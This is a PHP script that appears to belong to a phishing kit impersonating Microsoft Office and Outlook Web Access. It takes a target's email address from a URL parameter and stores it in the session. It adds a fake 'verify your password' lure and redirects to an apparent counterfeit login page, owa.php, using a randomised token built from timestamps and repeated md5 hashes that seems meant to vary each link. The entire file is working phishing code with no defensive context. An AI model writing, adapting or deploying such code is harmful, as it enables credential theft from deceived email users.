<?php
session_start();
function random_number(){
	$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key = array_rand($numbers);
	return $numbers[$key]; 
}

$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));


if (empty($_GET['ID____'])) {
    header("location:office.php?$url");
    
} else {
    $_SESSION['email'] = $_GET['ID____'];
    $_SESSION['automsg'] = "Because you're accessing sensitive info, you need to verify your password.";
    header("Location: owa.php?$url");
}
